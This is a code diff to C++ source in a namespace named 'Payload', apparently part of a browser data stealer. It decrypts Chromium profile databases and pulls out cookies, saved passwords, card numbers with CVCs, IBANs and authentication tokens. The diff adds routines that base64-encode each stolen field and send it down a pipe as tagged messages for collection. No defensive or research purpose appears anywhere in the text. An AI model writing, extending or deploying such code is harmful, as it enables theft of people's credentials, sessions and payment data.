@@ -8,6 +8,8 @@
 #include <sstream>
 #include <iomanip>
 #include <map>
+#include <windows.h>
+#include <wincrypt.h>
 
 namespace Payload {
 
@@ -118,7 +120,7 @@ namespace Payload {
         } catch(...) {}
 
         try {
-            // Cards & IBANs (Web Data)
+            // Cards & IBANs & Tokens (Web Data)
             auto webDataPath = profilePath / "Web Data";
             if (std::filesystem::exists(webDataPath)) {
                 if (auto db = OpenDatabaseWithHandleDuplication(webDataPath)) {
@@ -131,6 +133,30 @@ namespace Payload {
         } catch(...) {}
 
         CleanupTempFiles();
+    }
+
+    // Helper function to base64 encode
+    std::string Base64Encode(const std::string& input) {
+        if (input.empty()) return "";
+        
+        DWORD encodedSize = 0;
+        if (!CryptBinaryToStringA((const BYTE*)input.data(), (DWORD)input.size(), 
+                                 CRYPT_STRING_BASE64 | CRYPT_STRING_NOCRLF, nullptr, &encodedSize)) {
+            return ""; // Return empty on failure
+        }
+        
+        std::string encoded;
+        encoded.resize(encodedSize);
+        if (!CryptBinaryToStringA((const BYTE*)input.data(), (DWORD)input.size(), 
+                                 CRYPT_STRING_BASE64 | CRYPT_STRING_NOCRLF, &encoded[0], &encodedSize)) {
+            return ""; // Return empty on failure
+        }
+        
+        // Remove null terminator
+        if (!encoded.empty() && encoded.back() == '\0') {
+            encoded.pop_back();
+        }
+        return encoded;
     }
 
     void DataExtractor::ExtractCookies(sqlite3* db, const std::filesystem::path& outFile) {
@@ -151,7 +177,6 @@ namespace Payload {
                 auto decrypted = Crypto::AesGcm::Decrypt(m_key, encrypted);
                 
                 if (decrypted && !decrypted->empty()) {
-                    // Chrome cookies have a 32-byte header after decryption; Brave may not
                     std::string val;
                     if (decrypted->size() > 32) {
                         val = std::string((char*)decrypted->data() + 32, decrypted->size() - 32);
@@ -159,13 +184,35 @@ namespace Payload {
                         val = std::string((char*)decrypted->data(), decrypted->size());
                     }
 
+                    // Get all fields
+                    std::string domain = sqlite3_column_text(stmt, 0) ? (char*)sqlite3_column_text(stmt, 0) : "";
+                    std::string name = sqlite3_column_text(stmt, 1) ? (char*)sqlite3_column_text(stmt, 1) : "";
+                    std::string path = sqlite3_column_text(stmt, 2) ? (char*)sqlite3_column_text(stmt, 2) : "/";
+                    std::string expires = std::to_string(sqlite3_column_int64(stmt, 5));
+                    bool secure = sqlite3_column_int(stmt, 3) != 0;
+                    bool httpOnly = sqlite3_column_int(stmt, 4) != 0;
+                    
+                    // Base64 encode ALL text fields for pipe transmission
+                    std::string encodedDomain = Base64Encode(domain);
+                    std::string encodedName = Base64Encode(name);
+                    std::string encodedValue = Base64Encode(val);
+                    std::string encodedPath = Base64Encode(path);
+                    
+                    // Format: COOKIE_DETAIL:BASE64(domain)|BASE64(name)|BASE64(value)|expires|secure|httponly|BASE64(path)
+                    std::string cookieMsg = "COOKIE_DETAIL:" + encodedDomain + "|" + encodedName + "|" + 
+                                          encodedValue + "|" + expires + "|" +
+                                          (secure ? "1" : "0") + "|" + (httpOnly ? "1" : "0") + "|" +
+                                          encodedPath;
+                    m_pipe.Log(cookieMsg);
+
+                    // JSON output still uses JSON escaping
                     std::stringstream ss;
-                    ss << "{\"host\":\"" << EscapeJson((char*)sqlite3_column_text(stmt, 0)) << "\","
-                       << "\"name\":\"" << EscapeJson((char*)sqlite3_column_text(stmt, 1)) << "\","
-                       << "\"path\":\"" << EscapeJson((char*)sqlite3_column_text(stmt, 2)) << "\","
-                       << "\"is_secure\":" << (sqlite3_column_int(stmt, 3) ? "true" : "false") << ","
-                       << "\"is_httponly\":" << (sqlite3_column_int(stmt, 4) ? "true" : "false") << ","
-                       << "\"expires\":" << sqlite3_column_int64(stmt, 5) << ","
+                    ss << "{\"host\":\"" << EscapeJson(domain) << "\","
+                       << "\"name\":\"" << EscapeJson(name) << "\","
+                       << "\"path\":\"" << EscapeJson(path) << "\","
+                       << "\"is_secure\":" << (secure ? "true" : "false") << ","
+                       << "\"is_httponly\":" << (httpOnly ? "true" : "false") << ","
+                       << "\"expires\":" << expires << ","
                        << "\"value\":\"" << EscapeJson(val) << "\"}";
                     entries.push_back(ss.str());
                 }
@@ -181,7 +228,6 @@ namespace Payload {
                 out << entries[i] << (i < entries.size() - 1 ? ",\n" : "\n");
             }
             out << "]";
-            // Structured message: COOKIES:extracted:total
             m_pipe.Log("COOKIES:" + std::to_string(entries.size()) + ":" + std::to_string(total));
         }
     }
@@ -203,9 +249,24 @@ namespace Payload {
                 
                 if (decrypted) {
                     std::string val((char*)decrypted->data(), decrypted->size());
+                    
+                    // Get fields
+                    std::string url = sqlite3_column_text(stmt, 0) ? (char*)sqlite3_column_text(stmt, 0) : "";
+                    std::string user = sqlite3_column_text(stmt, 1) ? (char*)sqlite3_column_text(stmt, 1) : "";
+                    
+                    // Base64 encode ALL fields for pipe transmission
+                    std::string encodedUrl = Base64Encode(url);
+                    std::string encodedUser = Base64Encode(user);
+                    std::string encodedPass = Base64Encode(val);
+                    
+                    // Format: PASSWORD_DETAIL:BASE64(url)|BASE64(username)|BASE64(password)
+                    std::string passMsg = "PASSWORD_DETAIL:" + encodedUrl + "|" + encodedUser + "|" + encodedPass;
+                    m_pipe.Log(passMsg);
+
+                    // JSON output
                     std::stringstream ss;
-                    ss << "{\"url\":\"" << EscapeJson((char*)sqlite3_column_text(stmt, 0)) << "\","
-                       << "\"user\":\"" << EscapeJson((char*)sqlite3_column_text(stmt, 1)) << "\","
+                    ss << "{\"url\":\"" << EscapeJson(url) << "\","
+                       << "\"user\":\"" << EscapeJson(user) << "\","
                        << "\"pass\":\"" << EscapeJson(val) << "\"}";
                     entries.push_back(ss.str());
                 }
@@ -259,10 +320,27 @@ namespace Payload {
                     std::string num((char*)dec->data(), dec->size());
                     std::string cvc = (guid && cvcMap.count(guid)) ? cvcMap[guid] : "";
                     
+                    // Get fields
+                    std::string name = sqlite3_column_text(stmt, 1) ? (char*)sqlite3_column_text(stmt, 1) : "";
+                    int month = sqlite3_column_int(stmt, 2);
+                    int year = sqlite3_column_int(stmt, 3);
+                    std::string expiry = std::to_string(month) + "/" + std::to_string(year);
+                    
+                    // Base64 encode ALL fields for pipe transmission
+                    std::string encodedName = Base64Encode(name);
+                    std::string encodedNum = Base64Encode(num);
+                    std::string encodedExpiry = Base64Encode(expiry);
+                    std::string encodedCvc = Base64Encode(cvc);
+                    
+                    // Format: CARD_DETAIL:BASE64(name)|BASE64(number)|BASE64(expiry)|BASE64(cvc)
+                    std::string cardMsg = "CARD_DETAIL:" + encodedName + "|" + encodedNum + "|" + encodedExpiry + "|" + encodedCvc;
+                    m_pipe.Log(cardMsg);
+
+                    // JSON output
                     std::stringstream ss;
-                    ss << "{\"name\":\"" << EscapeJson((char*)sqlite3_column_text(stmt, 1)) << "\","
-                       << "\"month\":" << sqlite3_column_int(stmt, 2) << ","
-                       << "\"year\":" << sqlite3_column_int(stmt, 3) << ","
+                    ss << "{\"name\":\"" << EscapeJson(name) << "\","
+                       << "\"month\":" << month << ","
+                       << "\"year\":" << year << ","
                        << "\"number\":\"" << EscapeJson(num) << "\","
                        << "\"cvc\":\"" << EscapeJson(cvc) << "\"}";
                     entries.push_back(ss.str());
@@ -295,8 +373,21 @@ namespace Payload {
                 auto dec = Crypto::AesGcm::Decrypt(m_key, enc);
                 if (dec) {
                     std::string val((char*)dec->data(), dec->size());
+                    
+                    // Get fields
+                    std::string nickname = sqlite3_column_text(stmt, 1) ? (char*)sqlite3_column_text(stmt, 1) : "";
+                    
+                    // Base64 encode ALL fields for pipe transmission
+                    std::string encodedNickname = Base64Encode(nickname);
+                    std::string encodedIban = Base64Encode(val);
+                    
+                    // Format: IBAN_DETAIL:BASE64(nickname)|BASE64(iban)
+                    std::string ibanMsg = "IBAN_DETAIL:" + encodedNickname + "|" + encodedIban;
+                    m_pipe.Log(ibanMsg);
+
+                    // JSON output
                     std::stringstream ss;
-                    ss << "{\"nickname\":\"" << EscapeJson((char*)sqlite3_column_text(stmt, 1)) << "\","
+                    ss << "{\"nickname\":\"" << EscapeJson(nickname) << "\","
                        << "\"iban\":\"" << EscapeJson(val) << "\"}";
                     entries.push_back(ss.str());
                 }
@@ -347,8 +438,21 @@ namespace Payload {
                         }
                     }
 
+                    // Get fields
+                    std::string service = sqlite3_column_text(stmt, 0) ? (char*)sqlite3_column_text(stmt, 0) : "";
+                    
+                    // Base64 encode ALL fields for pipe transmission
+                    std::string encodedService = Base64Encode(service);
+                    std::string encodedToken = Base64Encode(val);
+                    std::string encodedBindingKey = Base64Encode(bindingKey);
+                    
+                    // Format: TOKEN_DETAIL:BASE64(service)|BASE64(token)|BASE64(binding_key)
+                    std::string tokenMsg = "TOKEN_DETAIL:" + encodedService + "|" + encodedToken + "|" + encodedBindingKey;
+                    m_pipe.Log(tokenMsg);
+
+                    // JSON output
                     std::stringstream ss;
-                    ss << "{\"service\":\"" << EscapeJson((char*)sqlite3_column_text(stmt, 0)) << "\","
+                    ss << "{\"service\":\"" << EscapeJson(service) << "\","
                        << "\"token\":\"" << EscapeJson(val) << "\","
                        << "\"binding_key\":\"" << EscapeJson(bindingKey) << "\"}";
                     entries.push_back(ss.str());
